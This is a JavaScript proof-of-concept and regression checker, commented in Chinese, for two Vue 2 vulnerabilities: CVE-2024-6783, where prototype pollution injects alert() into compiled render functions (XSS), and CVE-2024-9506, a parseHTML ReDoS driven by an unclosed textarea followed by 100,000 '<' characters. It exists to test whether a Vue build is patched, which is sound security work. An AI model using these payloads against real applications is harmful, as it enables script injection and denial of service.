// 浏览器侧 PoC，按官方披露形式重写：
//   * CVE-2024-6783 (Snyk SNYK-JS-VUETEMPLATECOMPILER-7444918)
//     模板使用最小形式 `<div></div>` —— 节点上不挂任何 own class/style，
//     这样 codegen 的 `if (el.staticClass)` / `el.classBinding` / `el.staticStyle`
//     / `el.styleBinding` 会沿原型链取到污染值，render 字符串里就会出现 alert()，
//     mount 时立即执行触发 XSS。修复版有 hasOwn 守卫，render 中不会出现 PAYLOAD。
//   * CVE-2024-9506 (Snyk SNYK-JS-VUE-8260040)
//     payload 形式：'<textarea>' + '<'.repeat(N)，未闭合 + 大量 '<'，
//     击中 parseHTML 中未做 ^ 锚定的 stackedTag 正则，触发指数级回溯。
//     编译跑在 Web Worker 内，硬超时即判定为 ReDoS（漏洞版会直接超时）。
import Vue from 'vue'

const out = document.getElementById('result')
const log = (label, pass, detail) => {
  const row = document.createElement('div')
  row.style.padding = '4px 0'
  row.style.fontFamily = 'monospace'
  row.innerHTML =
    `[<b style="color:${pass ? 'green' : 'red'}">${
      pass ? 'PASS' : 'FAIL'
    }</b>] ${escapeHtml(label)}` +
    (detail ? `<br><small>${detail}</small>` : '')
  out.appendChild(row)
}
const escapeHtml = s =>
  String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')

log('Vue 版本', true, Vue.version)

// ─── CVE-2024-6783 ──────────────────────────────────────────────
// 原型已在 poc.html 头部按 Snyk 官方 PoC 污染。
// 每个属性使用对应的最小模板（带 own 空 class / :class / style / :style 属性，
// 让模块从 attrsList 中摘掉它后，own staticClass 等仍未赋值，
// codegen 的 `if (el.X)` 沿原型链读到污染值并拼进 render，
// $mount 时 render 被执行 → alert / __alertCalled=true）。
{
  const cases = [
    {
      id: 'xss-staticClass',
      template: '<div class=""></div>',
      prop: 'staticClass'
    },
    {
      id: 'xss-classBinding',
      template: '<div :class=""></div>',
      prop: 'classBinding'
    },
    {
      id: 'xss-staticStyle',
      template: '<div style=""></div>',
      prop: 'staticStyle'
    },
    {
      id: 'xss-styleBinding',
      template: '<div :style=""></div>',
      prop: 'styleBinding'
    }
  ]

  for (const c of cases) {
    window.__alertCalled = false
    window.__alertMsg = null
    // 静态判定：直接调用 Vue.compile（runtime+compiler 构建会把模板编译器挂在 Vue 上）
    // 拿到的 render 字符串里若出现 PAYLOAD，即原型污染已渗入 codegen。
    const compiled = Vue.compile(c.template)
    const renderSrc = compiled.render.toString()
    const leakedInRender = renderSrc.indexOf('alert("Polluted")') !== -1

    // 动态判定：实际挂载 PoC，看 alert 是否被触发。
    let mountErr = null
    try {
      new Vue({
        render: compiled.render,
        staticRenderFns: compiled.staticRenderFns
      }).$mount('#' + c.id)
    } catch (e) {
      mountErr = e
    }
    const alerted = window.__alertCalled === true
    const vuln = leakedInRender || alerted
    log(
      `CVE-2024-6783  Object.prototype.${c.prop} 原型污染检测  模板 ${c.template}`,
      !vuln,
      vuln
        ? `⚠️ 漏洞已触发 — alert 被调用=${alerted}，render 含 PAYLOAD=${leakedInRender}<br>render = ${escapeHtml(
            renderSrc
          )}` + (mountErr ? `<br>mount 异常：${mountErr.message}` : '')
        : `已修复 — render 不含 PAYLOAD<br>render = ${escapeHtml(renderSrc)}`
    )
  }
}

// ─── CVE-2024-9506 ──────────────────────────────────────────────
// payload 形式来自 Snyk PoC：未闭合 <textarea> + 大量 '<'。
// 这里放到 Web Worker 内编译，硬超时即判 ReDoS。
{
  const THRESHOLD = 1000
  const HARD_TIMEOUT = 5000
  const payload = '<textarea>' + '<'.repeat(100_000)

  const worker = new Worker(new URL('./poc-worker.js', import.meta.url))
  let settled = false
  const finish = (pass, detail) => {
    if (settled) return
    settled = true
    clearTimeout(timer)
    worker.terminate()
    log('CVE-2024-9506  parseHTML ReDoS 检测', pass, detail)
  }
  const timer = setTimeout(
    () =>
      finish(false, `超时 >${HARD_TIMEOUT}ms（ReDoS 挂死，已强制终止 worker）`),
    HARD_TIMEOUT
  )
  worker.onmessage = e => {
    const { ok, dt, error } = e.data
    if (!ok) return finish(false, `worker 抛错：${error}`)
    finish(dt < THRESHOLD, `耗时 ${dt.toFixed(1)} ms（阈值 <${THRESHOLD}ms）`)
  }
  worker.onerror = e => finish(false, `worker error: ${e.message}`)
  worker.postMessage({ payload })
}
